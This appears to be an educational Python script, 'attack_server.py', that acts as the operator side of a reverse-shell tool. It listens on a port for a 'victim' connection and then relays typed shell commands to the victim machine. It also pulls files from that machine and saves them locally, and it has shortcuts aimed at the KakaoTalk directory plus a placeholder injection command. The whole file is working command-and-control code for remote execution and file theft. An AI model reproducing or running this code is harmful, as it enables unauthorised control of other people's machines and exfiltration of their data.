#attack_server.py
import socket
import os,time, subprocess
import ascii_quokka as ascii_quokka
import sys


VERSION="develop 2.0 , for education by jeho"

HOST = '0.0.0.0' # i don't know my ip, router!
PORT = 9001 #free port of host
CUSTUM_PORT = False # user enter to set port

print(VERSION)

current_directory_path = os.path.dirname(os.path.abspath(__file__))
print(f"script executing path : {current_directory_path}")

###debug script area

###
os.system('pause') #ascii 가 깨지지 않도록 interrupt

ascii_quokka.print_ascii(VERSION)

def bind_listen(sock,host,port):
    try:
        sock.bind((host, port))
        print(f"Listening : {port}")
    except socket.error as e:
        print(f"Listening Fail : {e}")
        os.system('pause')
    sock.listen(1)
    print('Waiting for victim connection...')

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_and_recv(conn_param,message): # socket send safe function. if send empty buffer, server cannot get. so should be altered
    BUFFER_SIZE=50000
    if(message==''):
        print("null message error...") #빈 패킷을 보내지않도록 처리
        return 0
    conn_param.send(message.encode())
    print("wait for client message...")
    recved = conn_param.recv(BUFFER_SIZE).decode('utf-8')
    print(recved)
    return recved


def file_transfer_mode(conn_param):
    send_and_recv(conn_param,"ft")
    print("file transfer mode ON...")
    filename_input = input("filename (exit to 'exit'):") # 파일이름 입력, 또는 exit

    if(filename_input=='exit'): # exit 입력 시 file transfer mode OFF
        print("exit command entered")
        send_and_recv(conn_param,"exit") # file transfer mode 끄라고 payload에 message 보내기
        return 0 # server 에서도 종료
    elif(filename_input==''):
        print("you put empty...file transfer mode OFF")
        send_and_recv(conn_param,"exit")
        return 0
    else: # 파일 이름 입력 시.
        print("filename entered...")
        recved = send_and_recv(conn_param,filename_input) # file_name send and wait

        if(recved[:5]=="error"): #victim 으로부터 file이 없다 등의 error 를 받으면 ft mode 종료
            print(f"recved : {recved}") #error 전문 출력
            return 0
        elif(recved[:8]=="fileinfo"):
            # file이 존재하면, victim 은 file info 를 보낸다. 
            print("fileinfo recved!!!")
            print(f"fileinfo : {recved}")

            fileinfostr, file_name, file_size = recved.split(":") #file_info recv

            file_size=int(file_size)

            print(f"file_name : {file_name}")
            print(f"file_size : {file_size}")

            file_content=b'' # file 조각을 모을 바이너리형 선언
 
            while len(file_content)<file_size:
                data_segment = conn.recv(50000)
                if not data_segment:
                    break
                file_content+=data_segment

            # 파일 저장 
            try:
                file_name_saved = f"{file_name}"
                file_download_path = os.path.join(current_directory_path,file_name_saved)
                with open(file_download_path,'wb') as f:
                    f.write(file_content)
                print(f"file saved success!! at : {file_download_path}")
                return 0 # 파일쓰기를 완료하면 ft_mode 종료
            except Exception as e:
                print(e)
                return 0 # 파일쓰기 오류가 발생하면 오류를 출력한 후 ft_mode 종료
        else: #오류 등이 발생한 경우,
            print("ft error...ft mode terminate...")
            return 0 # ft mode 종료

while(True):
    if(CUSTUM_PORT):
        port_input =input("input port to listen :")
        if(port_input==''):
            continue
        else:
            PORT = int(port_input)
        break
    else:
        break



my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while(True):
    try:
        bind_listen(my_sock,HOST,PORT)
        break
    except Exception as e:
        print(e)
        print(f"port 사용중 : {PORT}")


conn, addr = my_sock.accept()
print('\n')
print('Connected by', addr)
while True: # re loop while
    try:
        cmd = input('$')
        if(len(cmd)>0):  #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
            ##Quick command
            if(cmd==":cdkakao"):
                cmd="cd C:\Program Files (x86)\Kakao\KakaoTalk"
                send_and_recv(conn,cmd)
                pass
            elif(cmd==":injkakao"):
                cmd="asdf"
                send_and_recv(conn,cmd)
            elif(cmd=="cls"):
                clear_console()
            ##File command
            elif(cmd[:2]=="ft"):
                if(file_transfer_mode(conn)==0): # file_transfer_mode 를 끄는지 검사
                    continue # file_transfer_mode 를 끄면 re loop while
            elif(cmd[:4]=="term"):
                print("Remote Terminate Executed")
                send_and_recv(conn,cmd)
            else:
                send_and_recv(conn,cmd)
            

    except Exception as e:
        print(e)
        os.system("pause")
